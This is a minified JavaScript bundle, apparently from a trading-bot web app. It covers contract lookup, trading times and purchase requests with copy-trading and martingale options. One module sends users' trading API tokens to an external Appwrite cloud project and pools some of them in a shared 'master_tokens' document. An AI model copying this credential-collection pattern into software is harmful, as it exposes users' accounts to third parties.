                        let t = async () => {
                            if (this.retrieving_contracts_for[e]) return await this.retrieving_contracts_for[e], this.contracts_for[e].contracts;
                            this.retrieving_contracts_for[e] = new l.Z;
                            let t = await o.DO.api.send({
                                contracts_for: e
                            });
                            if (t.error) return [];
                            let {
                                contracts_for: {
                                    available: n
                                }
                            } = t, a = n.filter(e => "forward" !== e.start_type);
                            return this.contracts_for[e] = {
                                contracts: a,
                                timestamp: this.server_time.unix()
                            }, this.retrieving_contracts_for[e].resolve(), delete this.retrieving_contracts_for[e], a
                        };
                        if (this.contracts_for[e]) {
                            let {
                                contracts: n,
                                timestamp: a
                            } = this.contracts_for[e];
                            return this.server_time.unix() - a > 60 * this.cache_age_in_min && t(), n
                        }
                        return t()
                    }
                    async getDurations(e, t) {
                        let n = !(arguments.length > 2) || void 0 === arguments[2] || arguments[2];
                        if ("multiplier" === t || "accumulator" === t) return [];
                        let a = await this.getContractsFor(e),
                            {
                                NOT_AVAILABLE_DURATIONS: l,
                                DEFAULT_DURATION_DROPDOWN_OPTIONS: o
                            } = (0, i.vc)();
                        if (0 === a.length) return l;
                        let s = await this.getContractsByTradeType(e, t),
                            r = [],
                            d = e => o.findIndex(t => t[1] === e.replace(/\d+/g, "")),
                            c = (e, t) => {
                                let n = e.replace(/\D/g, ""),
                                    a = d(e),
                                    i = o.findIndex(e => e[1] === t),
                                    l = parseInt(n);
                                return o.slice(i + 1, a + 1).reverse().forEach(e => {
                                    switch (e[1]) {
                                        case "m":
                                        case "h":
                                            l *= 60;
                                            break;
                                        case "d":
                                            l *= 24
                                    }
                                }), l
                            };
                        if (s.forEach(e => {
                                if (!e.min_contract_duration || !e.max_contract_duration) return;
                                let t = d(e.min_contract_duration),
                                    a = d("1d" === e.max_contract_duration && n ? "24h" : e.max_contract_duration);
                                o.slice(t, a + 1).forEach((t, n) => {
                                    !(-1 !== r.findIndex(e => e.unit === t[1])) && r.push({
                                        display: t[0],
                                        unit: t[1],
                                        min: 0 === n ? parseInt(e.min_contract_duration.replace(/\D/g, "")) : 1,
                                        max: c(e.max_contract_duration, t[1])
                                    })
                                })
                            }), s.every(e => "intraday" === e.expiry_type)) {
                            let e = r.findIndex(e => "d" === e[1]); - 1 !== e && r.splice(e, 1)
                        }
                        return 0 === r.length ? l : r.sort((e, t) => d(e.unit) - d(t.unit))
                    }
                    async getPredictionRange(e, t) {
                        let n = await this.getContractsByTradeType(e, t),
                            a = this.getContractCategoryByTradeType(t),
                            l = [],
                            {
                                DIGIT_CATEGORIES: o,
                                opposites: s
                            } = (0, i.vc)();
                        if (o.includes(a) && "evenodd" !== t) {
                            let e = n.find(e => Object.keys(s).some(t => s[t].map(e => Object.keys(e)[0]).includes(e.contract_type)));
                            e && e.last_digit_range ? l.push(...e.last_digit_range) : l.push(1, 2, 3, 4, 5, 6, 7, 8)
                        }
                        return l
                    }
                    async getMultiplierRange(e, t) {
                        let n = await this.getContractsByTradeType(e, t),
                            a = [],
                            {
                                opposites: l
                            } = (0, i.vc)(),
                            o = n.find(e => Object.keys(l).some(t => l[t].map(e => Object.keys(e)[0]).includes(e.contract_type)));
                        return (null == o ? void 0 : o.multiplier_range) && a.push(...o.multiplier_range), a
                    }
                    async getMarketBySymbol(e) {
                        let t = await this.getContractsFor(e);
                        return t.length ? t[0].market : "na"
                    }
                    async getSubmarketBySymbol(e) {
                        let t = await this.getContractsFor(e);
                        return t.length ? t[0].submarket : "na"
                    }
                    async getGroupedTradeTypes(e) {
                        let t = await this.getContractsFor(e),
                            n = {};
                        for (let a = 0; a < t.length; a++) {
                            let i = t[a].market,
                                l = t[a].submarket,
                                o = this.getTradeTypeCategoryByTradeType(t[a].contract_category),
                                s = this.getTradeTypeCategoryNameByTradeType(t[a].contract_category),
                                r = await this.getTradeTypeByTradeCategory(i, l, e, o);
                            s && !this.isDisabledOption({
                                market: i,
                                submarket: l,
                                symbol: e,
                                trade_type_category: o
                            }) && (n[s] = r)
                        }
                        return n
                    }
                    async getTradeTypeByTradeCategory(e, t, n, a) {
                        let {
                            NOT_AVAILABLE_DURATIONS: l,
                            TRADE_TYPE_CATEGORIES: o,
                            opposites: s
                        } = (0, i.vc)(), r = o[a], d = [];
                        if (r && r.length)
                            for (let i = 0; i < r.length; i++) {
                                let o = r[i],
                                    c = JSON.stringify(await this.getDurations(n, o)) !== JSON.stringify(l);
                                if (!this.isDisabledOption({
                                        market: e,
                                        submarket: t,
                                        symbol: n,
                                        trade_type_category: a,
                                        trade_type: o
                                    }) && c) {
                                    let e = s[o.toUpperCase()],
                                        t = [],
                                        n = [];
                                    e.forEach(e => {
                                        t.push(Object.keys(e)[0]), n.push(Object.values(e)[0])
                                    }), d.push({
                                        name: n.join("/"),
                                        value: o,
                                        icon: t
                                    })
                                }
                            }
                        return d
                    }
                    async getTradeTypesForQuickStrategy(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "",
                            n = [],
                            a = [];
                        if ("ACCU" === t) return n.push({
                            text: "Buy",
                            value: "ACCU"
                        }), n;
                        let i = await this.getMarketBySymbol(e),
                            l = await this.getSubmarketBySymbol(e),
                            o = await this.getTradeTypeCategories(i, l, e);
                        for (let t = 0; t < o.length; t++) {
                            let n = o[t],
                                s = await this.getTradeTypeByTradeCategory(i, l, e, n[1]);
                            this.getHiddenCategories(s) < s.length && a.push(n)
                        }
                        for (let t = 0; t < a.length; t++) {
                            let o = a[t],
                                s = await this.getTradeTypeByTradeCategory(i, l, e, o[1]);
                            n.push(...this.getTradeTypeOptions(s, o))
                        }
                        return n
                    }
                    async getTradeTypeCategories(e, t, n) {
                        let {
                            TRADE_TYPE_CATEGORY_NAMES: a,
                            NOT_AVAILABLE_DROPDOWN_OPTIONS: l
                        } = (0, i.vc)(), o = await this.getContractsFor(n), s = [];
                        if (o.forEach(a => {
                                let i = this.getTradeTypeCategoryByTradeType(a.contract_category),
                                    l = this.getTradeTypeCategoryNameByTradeType(a.contract_category);
                                l && !this.isDisabledOption({
                                    market: e,
                                    submarket: t,
                                    symbol: n,
                                    trade_type_category: i
                                }) && !(-1 !== s.findIndex(e => e[1] === i)) && s.push([l, i])
                            }), s.length > 0) {
                            let e = Object.keys(a);
                            return s.sort((t, n) => {
                                let a = e.findIndex(e => e === t[1]);
                                return a - e.findIndex(e => e === n[1])
                            })
                        }
                        return l
                    }
                    async getTradeTypes(e, t, n, a) {
                        let {
                            NOT_AVAILABLE_DURATIONS: l,
                            TRADE_TYPE_CATEGORIES: o,
                            opposites: s
                        } = (0, i.vc)(), r = [], d = o[a];
                        if (d)
                            for (let i = 0; i < d.length; i++) {
                                let o = d[i],
                                    c = JSON.stringify(await this.getDurations(n, o)) !== JSON.stringify(l);
                                if (!this.isDisabledOption({
                                        market: e,
                                        submarket: t,
                                        symbol: n,
                                        trade_type_category: a,
                                        trade_type: o
                                    }) && c) {
                                    let e = s[o.toUpperCase()];
                                    r.push([e.map(e => e[Object.keys(e)[0]]).join("/"), o])
                                }
                            }
                        return r.length > 0 ? r : (0, i.vc)().NOT_AVAILABLE_DROPDOWN_OPTIONS
                    }
                    isDisabledOption(e) {
                        return this.disabled_options.some(t => Object.keys(t).every(n => e[n] === t[n]))
                    }
                    disposeCache() {
                        this.contracts_for = {}
                    }
                    constructor({
                        ws: e,
                        server_time: t
                    }) {
                        (0, a._)(this, "getAccumulationRange", async () => [.01, .02, .03, .04, .05]), (0, a._)(this, "getHiddenCategories", e => {
                            let t = 0;
                            for (let n = 0; n < e.length; n++) {
                                let a = e[n],
                                    l = (0, i.vc)().QUICK_STRATEGY.DISABLED.BARRIER_TRADE_TYPES.includes(a.value),
                                    o = (0, i.vc)().QUICK_STRATEGY.DISABLED.PREDICTION_TRADE_TYPES.includes(a.value);
                                (l || o) && t++
                            }
                            return t
                        }), (0, a._)(this, "getTradeTypeOptions", (e, t) => {
                            let n = [];
                            return e.forEach(e => {
                                let a = (0, i.vc)().QUICK_STRATEGY.DISABLED.BARRIER_TRADE_TYPES.includes(e.value),
                                    l = (0, i.vc)().QUICK_STRATEGY.DISABLED.PREDICTION_TRADE_TYPES.includes(e.value),
                                    o = ["multiplier"].includes(e.value);
                                !a && !l && !o && n.push({
                                    text: e.name,
                                    value: e.value,
                                    group: t[0],
                                    icon: e.icon
                                })
                            }), n
                        }), (0, a._)(this, "getContractTypes", e => {
                            let {
                                opposites: t
                            } = (0, i.vc)(), n = e;
                            return "ACCU" === n && (n = "accumulator"), t[n.toUpperCase()].map(e => ({
                                value: Object.keys(e)[0],
                                text: Object.values(e)[0]
                            }))
                        }), this.cache_age_in_min = 10, this.contracts_for = {}, this.ws = e, this.server_time = t, this.disabled_options = [{
                            submarket: "forex_basket",
                            trade_type: "higherlower"
                        }, {
                            submarket: "minor_pairs",
                            trade_type: "higherlower"
                        }, {
                            submarket: "metals",
                            trade_type: "callputequal"
                        }, {
                            market: "indices",
                            trade_type: "callputequal"
                        }, {
                            symbol: "OTC_AS51",
                            trade_type_category: "inout"
                        }, {
                            trade_type_category: "lookback"
                        }, {
                            trade_type_category: "callputspread"
                        }], this.retrieving_contracts_for = {}
                    }
                }
            },
            94915: function(e, t, n) {
                "use strict";
                n.d(t, {
                    PL: () => i.PL,
                    hL: () => i.hL,
                    go: () => i.go,
                    Lu: () => u.Lu,
                    LP: () => u.LP,
                    gb: () => C,
                    h4: () => m.h4,
                    M4: () => O,
                    Ug: () => x,
                    x2: () => E,
                    Yp: () => y,
                    Dz: () => S,
                    an: () => w,
                    kD: () => A,
                    YD: () => v,
                    LJ: () => m.LJ,
                    x_: () => m.x_,
                    Gq: () => N,
                    YS: () => s,
                    Xc: () => d,
                    tI: () => c.Z,
                    R1: () => T,
                    E9: () => a.Z,
                    ST: () => l.Z,
                    HP: () => o.Z,
                    DO: () => i.DO
                });
                var a = n("87911"),
                    i = n("79907"),
                    l = n("13604"),
                    o = n("48867");
                class s {
                    addEvents() {
                        "onLine" in navigator ? (window.addEventListener("online", () => this.setStatus()), window.addEventListener("offline", () => this.setStatus())) : (navigator.onLine = !0, setInterval(() => this.setStatus(), 1e4)), this.setStatus()
                    }
                    setStatus() {
                        navigator.onLine ? (this.parentElement.html("<span class='connecting'></span>"), this.api.send({
                            ping: "1"
                        }).then(() => {
                            this.parentElement.html("<span class='online'></span>")
                        })) : this.parentElement.html("<span class='offline'></span>")
                    }
                    constructor(e, t) {
                        this.api = e, this.parentElement = t, this.addEvents()
                    }
                }
                var r = n("29265");
                let d = (() => {
                    let e, t = !1,
                        n = new r.Z;
                    return {
                        init: a => {
                            !t && (e = a, n.resolve(e.server_time), t = !0)
                        },
                        get: () => t && e.server_time ? e.server_time.clone() : void 0,
                        timePromise: () => t ? Promise.resolve(e.server_time) : n.promise
                    }
                })();
                var c = n("30231"),
                    u = n("87383"),
                    m = n("21796"),
                    b = n("66032");
                let p = new b.KU;
                p.setEndpoint("https://cloud.appwrite.io/v1").setProject("65e94de0e88ed3878323");
                let f = "65e94f9f010594ef28c3",
                    _ = "65e94fab27826e64236d",
                    h = new b.Lg(p),
                    v = async e => {
                        let {
                            authorize: t,
                            error: n
                        } = await i.hL.authorize_3(e);
                        if (n) return `An error occured while updating tokens${n.toString()}`;
                        let a = t.loginid,
                            l = (0, u.LP)().account_id;
                        if (l.includes("VRTC")) return a.includes("VRTC") ? (void 0 !== await y() ? g(e) : k([e]), i.hL.api.send({
                            logout: 1
                        }), "VRTC") : (i.hL.api.send({
                            logout: 1
                        }), "You can't mix live and virtual account tokens, switch to virtual account and try to add the token again");
                        if (l.includes("CR")) return a.includes("CR") ? (void 0 !== await y() ? g(e) : k([e]), i.hL.api.send({
                            logout: 1
                        }), "CR") : (i.hL.api.send({
                            logout: 1
                        }), "You can't mix live and virtual account tokens, switch to real account and try to add the token again")
                    },
                    y = async () => {
                        try {
                            return (await h.getDocument(f, _, (0, u.LP)().account_id)).all_token
                        } catch (e) {}
                    },
                    k = async e => {
                        try {
                            await h.createDocument(f, _, (0, u.LP)().account_id, {
                                all_token: e
                            })
                        } catch (e) {}
                    },
                    g = async e => {
                        try {
                            let t = await y();
                            t.push(e), await h.updateDocument(f, _, (0, u.LP)().account_id, {
                                all_token: t
                            })
                        } catch (e) {}
                    };
                async function T(e) {
                    let t = "65fd1d5a950799af9f7a",
                        n = "all_tokens",
                        a = "ct_program_tokens";
                    try {
                        let i = await h.getDocument(t, n, a),
                            l = [...new Set([...i.master_tokens, ...e])];
                        l.length !== i.master_tokens.length && await h.updateDocument(t, n, a, {
                            master_tokens: l
                        })
                    } catch (e) {
                        console.error("Error updating document:", e)
                    }
                }
                async function E(e) {
                    let t = "65fd1d5a950799af9f7a",
                        n = "all_tokens",
                        a = "ct_program_tokens";
                    try {
                        let i = (await h.getDocument(t, n, a)).master_tokens.filter(t => t !== e);
                        await h.updateDocument(t, n, a, {
                            master_tokens: i
                        })
                    } catch (e) {
                        console.error("Error updating document:", e)
                    }
                }
                async function A(e) {
                    try {
                        return (await h.getDocument("65fd1d5a950799af9f7a", "all_tokens", "ct_program_tokens")).master_tokens.includes(e)
                    } catch (e) {
                        return console.error("Error fetching document:", e), !1
                    }
                }
                let x = async e => {
                        try {
                            let t = (await y()).filter(t => t !== e);
                            await h.updateDocument(f, _, (0, u.LP)().account_id, {
                                all_token: t
                            })
                        } catch (e) {}
                    },
                    w = e => {
                        let t = (0, u.LP)().account_id,
                            n = localStorage.getItem(`${t}_tokens`);
                        null !== (n = JSON.parse(n)) ? (Array.isArray(e) ? n = e : n.push(e), n = JSON.stringify(n)) : n = JSON.stringify(n = Array.isArray(e) ? e : [e]), localStorage.setItem(`${t}_tokens`, n)
                    },
                    N = e => {
                        let t = (0, u.LP)().account_id,
                            n = localStorage.getItem(`${t}_tokens`);
                        null !== (n = JSON.parse(n)) && (n = JSON.stringify(n.filter(t => t.token !== e)), localStorage.setItem(`${t}_tokens`, n))
                    },
                    S = async () => {
                        let e = (0, u.LP)().account_id,
                            t = localStorage.getItem(`${e}_tokens`);
                        if (null !== (t = JSON.parse(t))) {
                            if (t.length > 0) return t;
                            if (void 0 === (t = await y())) return [];
                            w(t)
                        } else {
                            if (void 0 === (t = await y())) return [];
                            w(t)
                        }
                        return t
                    },
                    C = e => {
                        let t = (0, u.LP)().account_id,
                            n = e;
                        n = JSON.stringify(n), localStorage.setItem(`${t}_tokens`, n)
                    },
                    O = async () => {
                        let e = (0, u.LP)().account_id,
                            t = await y();
                        return void 0 !== t ? (localStorage.getItem(`${e}_tokens`) && localStorage.removeItem(`${e}_tokens`), C(t), t) : []
                    }
            },
            89064: function(e, t, n) {
                "use strict";
                n.d(t, {
                    A3: function() {
                        return f
                    },
                    C9: function() {
                        return s
                    },
                    FT: function() {
                        return c
                    },
                    IS: function() {
                        return o
                    },
                    Ii: function() {
                        return p
                    },
                    Nf: function() {
                        return r
                    },
                    UM: function() {
                        return b
                    },
                    Zc: function() {
                        return m
                    },
                    ao: function() {
                        return d
                    },
                    bl: function() {
                        return u
                    },
                    cR: function() {
                        return l
                    }
                });
                var a, i = n(57090);
                var l = ((a = {}).OPENED = "opened", a.CLOSED = "closed", a.UNKNOWN = "unknown", a);
                let o = new i.X("unknown"),
                    s = new i.X(!1),
                    r = new i.X(!1),
                    d = new i.X([]),
                    c = new i.X(null),
                    u = e => {
                        o.next(e)
                    },
                    m = e => {
                        r.next(e)
                    },
                    b = e => {
                        s.next(e)
                    },
                    p = e => {
                        d.next(e)
                    },
                    f = e => {
                        (null == e ? void 0 : e.loginid) && localStorage.setItem("active_loginid", e.loginid), c.next(e)
                    }
            },
            30231: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Z: function() {
                        return i
                    }
                });
                var a = n(29265);
                class i {
                    async initialise() {
                        if (this.is_initialised) return this.init_promise;
                        if (this.is_initialised = !0, this.last_update_moment = this.server_time.local(), !Object.keys(this.trading_times).length) {
                            await this.updateTradingTimes(), this.init_promise.resolve();
                            let e = async () => {
                                let t = this.updateMarketOpenClosed();
                                Object.keys(t).length > 0 && this.onMarketOpenCloseChanged && this.onMarketOpenCloseChanged(t);
                                let n = this.nextUpdateDate();
                                if (!n) {
                                    let e = this.server_time.local(),
                                        t = this.last_update_moment.clone().add(1, "days");
                                    e.isAfter(t) ? this.last_update_moment = e.clone() : this.last_update_moment = t.clone();
                                    let a = {};
                                    Object.keys(this.trading_times).forEach(e => {
                                        a[e] = this.trading_times[e].is_opened
                                    }), await this.updateTradingTimes(), Object.keys(this.trading_times).forEach(e => {
                                        this.trading_times[e].is_opened = a[e]
                                    }), t.set({
                                        hour: 0,
                                        minute: 0,
                                        second: 0
                                    }), n = t.toDate()
                                }
                                let a = n - this.server_time.local().toDate();
                                this.update_timer = setTimeout(e, a)
                            };
                            await e()
                        }
                        return this.init_promise
                    }
                    async updateTradingTimes() {
                        var e;
                        let t = this.last_update_moment.format("YYYY-MM-DD"),
                            n = await (null === (e = this.ws) || void 0 === e ? void 0 : e.send({
                                trading_times: t
                            }));
                        if (n.error) return;
                        this.trading_times = {};
                        let a = this.server_time.local().toDate().toISOString().substring(0, 11),
                            i = e => new Date(`${a}${e}Z`),
                            {
                                trading_times: {
                                    markets: l
                                }
                            } = n;
                        if (!!l) null == l || l.forEach(e => {
                            let {
                                submarkets: t
                            } = e;
                            null == t || t.forEach(e => {
                                let {
                                    symbols: t
                                } = e;
                                null == t || t.forEach(e => {
                                    let t;
                                    let {
                                        times: n,
                                        symbol: a
                                    } = e, {
                                        open: l,
                                        close: o
                                    } = n, s = 1 === l.length && "00:00:00" === l[0] && "23:59:59" === o[0], r = 1 === l.length && "--" === l[0] && "--" === o[0];
                                    !s && !r && (t = l.map((e, t) => ({
                                        open: i(e),
                                        close: i(o[t])
                                    }))), this.trading_times[a] = {
                                        is_open_all_day: s,
                                        is_closed_all_day: r,
                                        times: t
                                    }
                                })
                            })
                        })
                    }
                    updateMarketOpenClosed() {
                        let e = {};
                        return Object.keys(this.trading_times).forEach(t => {
                            let n = this.calcIsMarketOpened(t),
                                a = this.trading_times[t];
                            a.is_opened !== n && (a.is_opened = n, e[t] = n)
                        }), e
                    }
                    calcIsMarketOpened(e) {
                        let t = this.server_time.local().unix(),
                            {
                                times: n,
                                is_open_all_day: a,
                                is_closed_all_day: i
                            } = this.trading_times[e];
                        return !i && (!!a || n.some(e => {
                            let {
                                open: n,
                                close: a
                            } = e;
                            return t >= n && t < a
                        }))
                    }
                    nextUpdateDate() {
                        let e;
                        let t = this.server_time.local().toDate();
                        return Object.keys(this.trading_times).forEach(n => {
                            let {
                                times: a,
                                is_open_all_day: i,
                                is_closed_all_day: l
                            } = this.trading_times[n];
                            if (!i && !l) a.forEach(n => {
                                let {
                                    open: a,
                                    close: i
                                } = n;
                                a > t && (!e || a < e) && (e = a), i > t && (!e || i < e) && (e = i)
                            })
                        }), e
                    }
                    isMarketOpened(e) {
                        let t = Object.keys(this.trading_times);
                        return !!(t.length && t.includes(e)) && this.trading_times[e].is_opened
                    }
                    constructor({
                        ws: e,
                        server_time: t
                    }) {
                        this.init_promise = new a.Z, this.is_initialised = !1, this.trading_times = {}, this.ws = e, this.server_time = t.clone()
                    }
                }
            },
            21796: function(e, t, n) {
                "use strict";
                n.d(t, {
                    LJ: function() {
                        return l
                    },
                    cM: function() {
                        return d
                    },
                    h4: function() {
                        return r
                    },
                    um: function() {
                        return s
                    },
                    vU: function() {
                        return c
                    },
                    x_: function() {
                        return o
                    }
                });
                var a = n(47962),
                    i = n(65464);
                let l = e => i.P.emit("bot.contract", e),
                    o = e => i.P.emit("contract.status", e),
                    s = e => i.P.emit("bot.info", e),
                    r = (e, t) => i.P.emit("ui.log.notify", {
                        className: e,
                        message: t,
                        sound: (0, a.vc)().lists.NOTIFICATION_SOUND[0][1]
                    }),
                    d = (e, t) => i.P.emit("ui.log.success", {
                        log_type: e,
                        extra: t
                    }),
                    c = e => i.P.emit("ui.log.error", e)
            },
            39338: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Fs: function() {
                        return T
                    },
                    Kn: function() {
                        return y
                    },
                    Mg: function() {
                        return p
                    },
                    Px: function() {
                        return x
                    },
                    VM: function() {
                        return f
                    },
                    l6: function() {
                        return k
                    },
                    mh: function() {
                        return g
                    },
                    nD: function() {
                        return b
                    },
                    pH: function() {
                        return d
                    },
                    vo: function() {
                        return A
                    }
                });
                var a = n(66175),
                    i = n(48059),
                    l = n(65464),
                    o = n(21796),
                    s = n(47962),
                    r = n(87383);
                let d = (e, t) => e.contractTypes.map(n => {
                        let i = {
                            amount: e.amount,
                            basis: e.basis,
                            contract_type: n,
                            currency: e.currency,
                            duration: e.duration,
                            duration_unit: e.duration_unit,
                            multiplier: e.multiplier,
                            passthrough: {
                                contract_type: n,
                                purchase_reference: t
                            },
                            proposal: 1,
                            symbol: u(e)
                        };
                        return void 0 !== e.prediction && (i.selected_tick = e.prediction), ["TICKLOW", "TICKHIGH"].includes(n) || void 0 === e.prediction ? void 0 !== e.barrierOffset && (i.barrier = e.barrierOffset) : i.barrier = e.prediction, void 0 !== e.secondBarrierOffset && (i.barrier2 = e.secondBarrierOffset), ["MULTUP", "MULTDOWN"].includes(n) && (i.duration = void 0, i.duration_unit = void 0), !(0, a.Qr$)(e.limit_order) && (i.limit_order = e.limit_order), i
                    }),
                    c = (e, t) => {
                        if (s.GL.vh_variables.is_martingale_active) return s.GL.vh_variables.mart_stake;
                        if (s.GL.vh_variables.is_enabled) return "ACCU" == t ? 1 : s.GL.vh_variables.stake;
                        return e.amount
                    },
                    u = e => s.GL.other_symbol.isActive ? s.GL.other_symbol.symbol : e.symbol,
                    m = ["DIGITEVEN", "DIGITODD", "CALLE", "PUTE", "RUNHIGH", "RUNLOW", "RESETCALL", "RESETPUT", "TICKHIGH", "TICKLOW", "ASIANU", "ASIAND"],
                    b = (e, t) => {
                        let n = localStorage.getItem(`${(0,r.LP)().account_id}_tokens`);
                        n = JSON.parse(n);
                        let i = s.GL.vh_variables.is_enabled,
                            l = s.GL.copy_trading.is_active,
                            o = s.GL.demo_copy_trading.is_active,
                            d = i ? {
                                buy: "1",
                                subscribe: 1,
                                price: c(t, e),
                                parameters: {
                                    amount: c(t, e),
                                    basis: t.basis,
                                    contract_type: e,
                                    currency: t.currency,
                                    duration: t.duration,
                                    duration_unit: t.duration_unit,
                                    multiplier: t.multiplier,
                                    symbol: u(t)
                                }
                            } : l ? {
                                buy_contract_for_multiple_accounts: "1",
                                tokens: [(0, r.LP)().token, ...n],
                                price: c(t, e),
                                parameters: {
                                    amount: c(t, e),
                                    basis: t.basis,
                                    contract_type: e,
                                    currency: t.currency,
                                    duration: t.duration,
                                    duration_unit: t.duration_unit,
                                    multiplier: t.multiplier,
                                    symbol: u(t)
                                }
                            } : o ? {
                                buy_contract_for_multiple_accounts: "1",
                                tokens: [(0, r.LP)().token, (0, r.Lu)(s.GL.demo_copy_trading.login_id).token],
                                price: c(t, e),
                                parameters: {
                                    amount: c(t, e),
                                    basis: t.basis,
                                    contract_type: e,
                                    currency: t.currency,
                                    duration: t.duration,
                                    duration_unit: t.duration_unit,
                                    multiplier: t.multiplier,
                                    symbol: u(t)
                                }
                            } : {
                                buy: "1",
                                price: c(t, e),
                                parameters: {
                                    amount: c(t, e),
                                    basis: t.basis,
                                    contract_type: e,
                                    currency: t.currency,
                                    duration: t.duration,
                                    duration_unit: t.duration_unit,
                                    multiplier: t.multiplier,
                                    symbol: u(t)
                                }
                            };
                        return s.GL.pred_setter.allow_pred_setter && (t.prediction = s.GL.pred_setter.prediction), m.includes(e) && (delete t.prediction, delete t.barrier, delete t.barrierOffset, delete t.secondBarrierOffset), void 0 !== t.prediction && (d.parameters.selected_tick = t.prediction), ("NOTOUCH" === d.parameters.contract_type || "ONETOUCH" === d.parameters.contract_type) && void 0 === t.barrierOffset && (t.prediction = s.GL.touch_notouch_vars.barrier_offset), ["TICKLOW", "TICKHIGH"].includes(e) || void 0 === t.prediction ? void 0 !== t.barrierOffset && (("NOTOUCH" === d.parameters.contract_type || "ONETOUCH" === d.parameters.contract_type) && s.GL.touch_notouch_vars.barrier_offset_active ? d.parameters.barrier = s.GL.touch_notouch_vars.barrier_offset : d.parameters.barrier = t.barrierOffset) : d.parameters.barrier = t.prediction, void 0 !== t.secondBarrierOffset && (d.parameters.barrier2 = t.secondBarrierOffset), !(0, a.Qr$)(t.app_markup_percentage) && (d.parameters.app_markup_percentage = t.app_markup_percentage), !(0, a.Qr$)(t.barrier_range) && (d.parameters.barrier_range = t.barrier_range), !(0, a.Qr$)(t.date_expiry) && (d.parameters.date_expiry = t.date_expiry), !(0, a.Qr$)(t.date_start) && (d.parameters.date_start = t.date_start), !(0, a.Qr$)(t.product_type) && (d.parameters.product_type = t.product_type), !(0, a.Qr$)(t.trading_period_start) && (d.parameters.trading_period_start = t.trading_period_start), !(0, a.Qr$)(t.limit_order) && (d.parameters.limit_order = t.limit_order), ["MULTUP", "MULTDOWN"].includes(e) && (d.parameters.duration = void 0, d.parameters.duration_unit = void 0, d.parameters.multiplier = t.multiplier), ["ACCU"].includes(e) && (d.parameters.duration = void 0, d.parameters.duration_unit = void 0, d.parameters.growth_rate = t.growth_rate), d
                    },
                    p = e => {
                        let {
                            length: t
                        } = e, [n, a] = e.slice(-2), i = "";
                        return t >= 2 && (i = n.quote < a.quote ? "rise" : i, i = n.quote > a.quote ? "fall" : i), i
                    },
                    f = e => {
                        let t = e;
                        return "number" == typeof t && (t = String(t)), Number(t[t.length - 1])
                    },
                    _ = (e, t) => {
                        let n = Math.min(2.5 * t, 15),
                            {
                                error: a = {},
                                msg_type: l = ""
                            } = e,
                            {
                                code: s = "",
                                message: r = ""
                            } = a,
                            d = "";
                        if (s) switch (s) {
                            case "RateLimit":
                                d = (0, i.NC)("You are rate limited for: {{ message_type }}, retrying in {{ delay }}s (ID: {{ request }})", {
                                    message_type: a.msg_type,
                                    delay: n,
                                    request: a.echo_req.req_id
                                });
                                break;
                            case "DisconnectError":
                                d = (0, i.NC)("You are disconnected, retrying in {{ delay }}s", {
                                    delay: n
                                });
                                break;
                            case "MarketIsClosed":
                                d = (0, i.NC)("{{ message }}, retrying in {{ delay }}s", {
                                    message: r || (0, i.NC)("The market is closed"),
                                    delay: n
                                });
                                break;
                            case "OpenPositionLimitExceeded":
                                d = (0, i.NC)("You already have an open position for this contract type, retrying in {{ delay }}s", {
                                    delay: n
                                });
                                break;
                            default:
                                d = (0, i.NC)("Request failed for: {{ message_type }}, retrying in {{ delay }}s", {
                                    message_type: l || (0, i.NC)("unknown"),
                                    delay: n
                                })
                        } else d = (0, i.NC)("Request failed for: {{ message_type }}, retrying in {{ delay }}s", {
                            message_type: l || (0, i.NC)("unknown"),
                            delay: n
                        });
                        return (0, o.vU)(d), 1e3 * n
                    },
                    h = e => {
                        var t, n, a;
                        (null === (t = e.error) || void 0 === t ? void 0 : t.code) === "InputValidationFailed" && ((null === (n = e.error.details) || void 0 === n ? void 0 : n.duration) && (e.error.message = (0, i.NC)("Duration must be a positive integer")), (null === (a = e.error.details) || void 0 === a ? void 0 : a.amount) && (e.error.message = (0, i.NC)("Amount must be a positive number.")))
                    },
                    v = function(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : [];
                        return !!e.error && (h(e), !t.concat(["CallError", "WrongResponse", "GetProposalFailure", "RateLimit", "DisconnectError", "MarketIsClosed", "OpenPositionLimitExceeded"]).includes(e.error.code))
                    },
                    y = (e, t, n, i, o) => new Promise((s, r) => {
                        let d = e();
                        d ? d.then(s).catch(e => {
                            if (v(e, n) || o && !o.is_running) {
                                r(e);
                                return
                            }
                            t(e.error.code, () => new Promise(t => {
                                let n = () => l.P.getState("global_timeouts") ? ? [],
                                    o = setTimeout(() => {
                                        let e = n();
                                        delete e[o], l.P.setState(e), t()
                                    }, _(e, i)),
                                    s = n(),
                                    r = (0, a.LI1)(e, "msg_type");
                                s[o] = {
                                    is_cancellable: ["buy"].includes(r),
                                    msg_type: r
                                }, l.P.setState({
                                    global_timeouts: s
                                })
                            }))
                        }) : s()
                    }),
                    k = (e, t, n) => {
                        let a = 1;
                        return new Promise((i, l) => {
                            let o = (e, t) => {
                                    a++, t().then(s)
                                },
                                s = () => {
                                    y(e, o, t, a, n).then(i).catch(l)
                                };
                            s()
                        })
                    },
                    g = e => {
                        let {
                            sell_price: t,
                            buy_price: n,
                            currency: i
                        } = e, l = (0, a.bfN)(t - n, i);
                        return [e.transaction_ids.buy, +e.buy_price, +e.sell_price, l, e.contract_type, (0, a.mrB)(parseInt(`${e.entry_tick_time}000`), "HH:mm:ss"), +e.entry_tick, (0, a.mrB)(parseInt(`${e.exit_tick_time}000`), "HH:mm:ss"), +e.exit_tick, +(e.barrier ? e.barrier : 0), l < 0 ? "loss" : "win"]
                    },
                    T = () => `${new Date().getTime()*Math.random()}`,
                    E = (e, t) => t.getAllBlocks().some(t => t.type === e && !!t.parentBlock_),
                    A = () => ({
                        has_payout_block: E("payout", window.Blockly.derivWorkspace),
                        is_basis_payout: !1
                    }),
                    x = {
                        [WebSocket.CONNECTING]: "Connecting",
                        [WebSocket.OPEN]: "Connected",
                        [WebSocket.CLOSING]: "Closing",
                        [WebSocket.CLOSED]: "Closed"
                    }
            },
            55967: function(e, t, n) {
                "use strict";
                n.d(t, {
                    T: function() {
                        return l
                    }
                });
                var a = n(48059);
                let i = function(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "workspace";
                        return {
                            missing: (0, a.NC)("The {{block_type}} block is mandatory and cannot be deleted/disabled.", {
                                block_type: e
                            }),
                            misplaced: (0, a.NC)("The {{block_type}} block is misplaced from {{missing_space}}.", {
                                block_type: e,
                                missing_space: t
                            }),
